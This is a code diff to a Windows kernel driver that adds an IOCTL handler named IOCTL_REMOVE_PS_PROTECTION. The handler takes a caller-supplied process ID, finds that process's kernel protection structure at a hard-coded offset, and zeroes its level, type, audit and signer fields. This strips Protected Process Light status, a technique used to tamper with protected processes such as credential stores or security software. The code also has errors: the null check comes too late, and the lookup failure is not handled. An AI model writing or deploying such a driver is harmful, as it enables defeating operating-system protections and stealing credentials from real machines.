@@ -1,3 +1,4 @@
+#include <ntifs.h>
 #include <ntddk.h>
 #include <ntdef.h>
 #include <aux_klib.h>
@@ -286,6 +287,28 @@ NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 		Version->BuildNumber = osInfo.dwBuildNumber;
 
 		length += sizeof(WINDOWS_VERSION);
+		break;
+	}
+	case IOCTL_REMOVE_PS_PROTECTION:
+	{
+		DbgPrint("[*] IOCTL_REMOVE_PS_PROTECTION\n");
+		PTARGET_PROCESS target = (PTARGET_PROCESS)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+		PEPROCESS eProcess;
+		status = PsLookupProcessByProcessId((HANDLE)target->ProcessId, &eProcess);
+		PPS_PROTECTION psProtect = (PPS_PROTECTION)(((ULONG_PTR)eProcess) + PS_PROTECTION_OFFSET);
+		if (psProtect == nullptr)
+		{
+			status = STATUS_INVALID_PARAMETER;
+			ObDereferenceObject(eProcess);
+		}
+		DbgPrint("[*] level:%d\n", psProtect->Level);
+		DbgPrint("[*] type:%d\n", psProtect->Type);
+		DbgPrint("[*] audit:%d\n", psProtect->Audit);
+		DbgPrint("[*] signer:%d\n", psProtect->Signer);
+		psProtect->Level = 0;
+		psProtect->Type = 0;
+		psProtect->Audit = 0;
+		psProtect->Signer = 0;
 		break;
 	}
 	default:
